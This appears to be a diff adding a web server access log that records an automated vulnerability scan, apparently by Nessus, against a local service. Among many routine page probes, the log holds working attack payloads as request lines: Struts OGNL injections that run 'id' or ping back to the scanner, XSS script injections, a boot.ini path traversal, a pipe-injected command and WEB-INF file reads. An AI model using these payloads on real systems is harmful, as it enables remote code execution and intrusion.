+INFO:     192.168.31.2:45416 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45424 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45438 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45450 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45460 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45468 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45474 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45476 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45488 - "GET /cwhp/CSMSDesktop/about.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45490 - "GET /CSCOnm/servlet/login/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45504 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45518 - "GET http%3A//192.168.8.229%3A8080/authentication/login/ HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:45544 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45554 - "GET /lang_pack/EN.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45560 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45566 - "GET /login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45578 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45588 - "GET /CSCOnm/servlet/login/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45600 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45612 - "GET /about.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45618 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45632 - "GET /admin/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45636 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45650 - "GET /restconf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45656 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45664 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45676 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45688 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45698 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45702 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45708 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45720 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45736 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45742 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45746 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45756 - "GET /csamc52/webadmin?page=invalid&type=browser HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56986 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56998 - "GET /admin/public/index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57006 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57010 - "GET /%2BCSCOE%2B/logon.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57026 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57040 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57044 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57060 - "GET /nls/ApplicationProperties-en.json HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57068 - "GET /securecgi-bin/CSUserCGI.exe?ver HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57082 - "GET /securecgi-bin/CSUserCGI.exe?Init+0 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57088 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57100 - "GET /changelog HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57106 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57120 - "GET /version HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:57144 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57154 - "GET /version HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57170 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57176 - "GET /Login.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57192 - "GET /admin/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57196 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57212 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57226 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57232 - "GET /cacti HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57236 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57238 - "GET /MM/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57240 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57252 - "GET /hss/hss?pg=login.ftl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57268 - "GET /%25NETHOOD%25/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57280 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57294 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57306 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57314 - "GET /brightmail/viewLogin.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57330 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57344 - "GET /nosuchfile-1974427941-115296384.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57346 - "GET /self_upgrade.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57362 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57376 - "GET /webapps/login/index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57388 - "GET /webct/about.jsp HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:57408 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57414 - "GET /WS2020/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57424 - "GET /WS2021/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57440 - "GET /WS2022/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57456 - "GET /WS2023/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57466 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57468 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57484 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57500 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57512 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57520 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57530 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57540 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57548 - "GET /.htaccess.old HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57556 - "GET /.htaccess.bak HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57564 - "GET /.htaccess~ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57568 - "GET /.htaccess.copy HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57574 - "GET /.htaccess.tmp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57578 - "GET /..htaccess.swp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57584 - "GET /.htaccess.1 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57596 - "GET /.htaccess.~1~ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57610 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57618 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57634 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57636 - "GET /header.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57646 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57654 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57660 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57668 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57672 - "GET /cgi-bin/kvm.cgi?&file=login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57686 - "GET /snmx-cgi/fxm.exe HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57696 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57710 - "GET /recordings/index.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57726 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57734 - "GET /web/%23/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57750 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57754 - "GET /platform-ui/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57768 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57776 - "GET /management/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57790 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57796 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57800 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57806 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57820 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57834 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57836 - "GET /server-info HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57852 - "GET /login/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57856 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57866 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57878 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57880 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57892 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57908 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57920 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57932 - "GET /roller-ui/login.rol HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57944 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57946 - "GET /pluto/portal/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57954 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57958 - "GET /nifi/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:60038 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:60052 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39670 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39672 - "GET /kylin/api/admin/version HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39684 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39698 - "GET /translations/en.json HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39708 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39722 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39726 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39736 - "GET /unified-console.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39746 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39758 - "GET /login/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39768 - "GET /admin/airflow/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39780 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39786 - "GET /api/v1/?format=api HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39796 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39800 - "GET /api/v1/?format=api HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39808 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39820 - "GET /libs/granite/core/content/login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39828 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39840 - "GET /altercast/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39842 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39854 - "GET /system/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39866 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39870 - "GET /system/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39876 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39886 - "GET usaherds/Logon.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39894 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39902 - "GET /courier/web/1000%40/wmLogin.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39914 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39924 - "GET / HTTP/1.0" 200 OK
+INFO:     192.168.31.2:39938 - "GET / HTTP/1.0" 200 OK
+INFO:     192.168.31.2:39948 - "GET /chassis/config/GeneralChassisConfig.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39954 - "GET /servlet/admin?category=server&method=listAll&Authorization=Digest+username%3D%22admin%22%2C+response%3D%22ae9f86d6beaa3f9ecb9a5b7e072a4138%22%2C+nonce%3D%222b089ba7985a883ab2eddcd3539a6c94%22%2C+realm%3D%22adminRealm%22%2C+uri%3D%22%2Fservlet%2Fadmin%22&service= HTTP/1.0" 404 Not Found
+INFO:     192.168.31.2:39962 - "GET /bigipgui/bigconf.cgi?command=bigcommand&CommandType=bigpipe HTTP/1.0" 404 Not Found
+INFO:     192.168.31.2:39974 - "GET /this_page_should_not_exist.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39978 - "GET /qwe/qwe/index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:39986 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:39992 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:40000 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:40016 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:40020 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:40030 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:41286 - "GET /favicon2.iso HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:41294 - "GET /favicon.iso HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:34994 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:34996 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:35006 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:33064 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:33068 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:40602 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56002 - "GET /sse HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:33868 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:33874 - "GET /axis2/services/CUPMService/ping HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:33888 - "GET /dfcweb/lib/cupm/nls/applicationproperties.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:33900 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:33902 - "GET /emsam/index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:42500 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51560 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     192.168.31.2:52036 - "GET //%28%23mem%3D%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29%3F%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29%3Aindex.xhtml?cmd=ping%20%2dc%203%20%2dp%203659714c384a506f7873%20192.168.31.2 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:54888 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:54896 - "GET /?tag=tenable-577294075&method%3a%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23writer%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23writer.println(%23parameters.tag[0]),%23writer.flush(),%23writer.close HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46358 - "GET %24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping%20-c%203%20-p%2066786147394451764e73%20192.168.31.2%27%29%29%7D// HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56634 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56646 - "GET /?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'id'})).start()} HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56648 - "GET /?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23webroot%3d%23req.getSession().getServletContext().getRealPath('/'),%23resp%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23resp.print('At%201756331528%20Nessus%20found%20the%20path%20is%20'),%23resp.println(%23webroot),%23resp.flush(),%23resp.close()} HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56660 - "GET /?redirect:$%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20-c%203%20-p4466626e434949325870%20192.168.31.2%27%29.getInputStream%28%29%29%7d HTTP/1.1" 200 OK
+INFO:     192.168.31.2:35108 - "GET /?redirect:%24%7B57550614%2b16044095%7D HTTP/1.1" 200 OK
+INFO:     192.168.31.2:35110 - "GET %24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping%20-c%203%20-p%2066786147394451764e73%20192.168.31.2%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D// HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50326 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50340 - "GET //%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3D%21%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%2C%28%40java.lang.Runtime%40getRuntime%28%29%29.exec%28%27id%27%29.waitFor%28%29%7D.action HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50352 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50364 - "POST /flex2gateway/http HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50374 - "POST /messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50384 - "POST /blazeds/messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50394 - "POST /lcds/messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36204 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36212 - "GET %24%7B%7B57550614%2B16044095%7D%7D// HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36322 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36334 - "GET /Websense/cgi-bin/WsCgiLogin.exe?Page=login&UserName=nessus%22%3e%3cscript%3ealert%28%27websense_username_xss.nasl%27%29%3c%2fscript%3e HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36350 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36366 - "GET /webhost HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36374 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36382 - "GET /console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36398 - "GET /console/faces/com_sun_web_ui/help/helpwindow.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36404 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36414 - "GET /?"><script>alert('struts_sa_surl_xss.nasl-1756331565')</script> HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36418 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36420 - "GET /LoginPage.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36430 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36436 - "GET /home.jsf?autoScroll=0%2c275%29%3b%2f%2f--%3e%3c%2fscript%3e%3cscript%3ealert%28%27myfaces_tomahawk_autoscroll_xss.nasl%27 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36444 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36452 - "GET /index.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36466 - "GET /Default.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36476 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36490 - "GET /item.fts?href=%22%3E%3Cscript%3Ealert%28%22ftgate_44002.nasl%22%29%3C%2Fscript%3E%3B HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36498 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36504 - "GET /login?user=**%3Cscript%3EJavaScript:alert('cpanel_login_user_xss.nasl')%3B%3C%2Fscript%3E HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36508 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36524 - "GET /admin/statistics/ConfigureStatistics HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36526 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36540 - "GET /altercast/AlterCast?op=%3cscript%3ealert%28%22adobe_document_server_61.nasl%22%29%3c%2fscript%3e HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36552 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36566 - "GET /nul.dbm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36572 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36582 - "GET /s/cfx/_/%3B/WEB-INF/web.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36598 - "GET /s/cfx/_/%3B/WEB-INF/classes/seraph-config.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36606 - "GET /s/cfx/_/%3B/WEB-INF/decorators.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36618 - "GET /s/cfx/_/%3B/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36622 - "GET /s/cfx/_/%3B/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36626 - "GET /s/cfx/_/%3B/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36632 - "GET /s/cfx/_/%3B/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36636 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36640 - "GET /mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36654 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36658 - "GET /index.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36672 - "GET /index.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36674 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36690 - "GET /web.config HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36700 - "GET /scripts/w3who.dll HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36702 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36706 - "GET /cgi-bin/filescan HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36716 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36718 - "GET /caspadmin/index.asp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36730 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36744 - "GET /struts/webconsole.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36756 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36770 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     192.168.31.2:36774 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36782 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36790 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36798 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36804 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36820 - "GET /?class.classLoader.URLs[0]=struts_2_3_16_1_classloader_manipulation-1756331569 HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36834 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36836 - "GET //%24%7B675480775%2B5%7D.action HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36844 - "GET //%24%7B%23w%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29%2C%23w.print%28%27Nessus%20Response%3A%20%27%29%2C%23w.println%28%27struts_2_3_14_3_command_execution-675480775%27%29%2C%23w.flush%28%29%2C%23w.close%28%29%7D.action HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36850 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36858 - "GET //struts/webconsole.html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:36864 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36872 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36880 - "GET /.anydomain.test HTTP/1.0" 404 Not Found
+INFO:     192.168.31.2:36890 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36904 - "GET /etc/mnt_info.csv HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36916 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36926 - "POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36932 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36944 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36960 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36976 - "GET /xsql/demo/airport/airport.xsql?xml-stylesheet=none HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36992 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36996 - "GET /OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id| HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:37012 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:37018 - "GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1" 404 Not Found
